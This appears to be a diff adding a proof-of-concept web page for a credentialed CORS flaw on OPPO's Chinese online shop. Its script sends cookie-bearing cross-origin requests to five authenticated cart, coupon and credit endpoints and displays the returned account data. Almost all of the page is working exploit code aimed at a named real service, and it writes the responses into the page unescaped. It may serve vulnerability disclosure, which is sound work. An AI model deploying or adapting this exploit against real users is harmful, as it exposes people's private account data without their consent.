@@ -1,1 +1,212 @@
 
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<title>OPPO CORS Exploit Proof of Concept</title>
+
+<style>
+
+body{
+font-family: Arial, sans-serif;
+background:#f5f6fa;
+margin:40px;
+color:#2c3e50;
+}
+
+.container{
+max-width:900px;
+margin:auto;
+background:white;
+padding:30px;
+border-radius:8px;
+box-shadow:0 4px 12px rgba(0,0,0,0.08);
+}
+
+h1{
+margin-bottom:10px;
+}
+
+.description{
+background:#eef3ff;
+padding:15px;
+border-left:4px solid #4a6cf7;
+margin-bottom:25px;
+}
+
+button{
+background:#4a6cf7;
+color:white;
+border:none;
+padding:12px 25px;
+font-size:16px;
+border-radius:5px;
+cursor:pointer;
+}
+
+button:hover{
+background:#3a57cc;
+}
+
+.result{
+margin-top:20px;
+padding:15px;
+border-radius:6px;
+background:#fafafa;
+border:1px solid #ddd;
+white-space:pre-wrap;
+font-family:monospace;
+}
+
+.success{
+border-left:5px solid #27ae60;
+}
+
+.error{
+border-left:5px solid #e74c3c;
+}
+
+.endpoint{
+font-weight:bold;
+margin-bottom:6px;
+}
+
+.footer{
+margin-top:30px;
+font-size:14px;
+color:#777;
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+<div class="container">
+
+<h1>OPPO Credentialed CORS Exploit Proof of Concept</h1>
+
+<div class="description">
+
+This Proof of Concept demonstrates a credentialed cross-origin data exposure
+via misconfigured CORS policy on multiple authenticated API endpoints.
+
+The exploit uses XMLHttpRequest with credentials enabled, allowing session cookies
+to be included automatically and sensitive account data to be retrieved cross-origin.
+
+Click the button below while logged into an OPPO account to reproduce the issue.
+
+</div>
+
+
+<button onclick="run()">Run exploit</button>
+
+
+<div id="output"></div>
+
+
+<div class="footer">
+
+Affected endpoints:
+
+/cart/v1/list  
+/cart/getCount  
+/coupons/count  
+/credits/getUserCredit  
+/credits/show
+
+</div>
+
+
+</div>
+
+
+<script>
+
+function run()
+{
+
+document.getElementById("output").innerHTML="";
+
+const endpoints = [
+
+"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
+
+"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
+
+"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
+
+"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
+
+"https://www.opposhop.cn/cn/oapi/credits/web/credits/show"
+
+];
+
+
+for(let url of endpoints)
+{
+
+let xhttp = new XMLHttpRequest();
+
+xhttp.onreadystatechange = function()
+{
+
+if(this.readyState == 4)
+{
+
+displayResult(url,this.status,this.responseText);
+
+}
+
+};
+
+
+xhttp.open("GET",url,true);
+
+xhttp.withCredentials = true;
+
+xhttp.send();
+
+}
+
+}
+
+
+
+function displayResult(endpoint,status,response)
+{
+
+let container=document.getElementById("output");
+
+let block=document.createElement("div");
+
+block.className="result";
+
+if(status===200)
+block.classList.add("success");
+
+else
+block.classList.add("error");
+
+
+block.innerHTML=
+
+"<div class='endpoint'>Endpoint:</div>"+endpoint+
+
+"\n\nStatus:\n"+status+
+
+"\n\nResponse:\n"+response;
+
+
+container.appendChild(block);
+
+}
+
+</script>
+
+
+</body>
+</html>
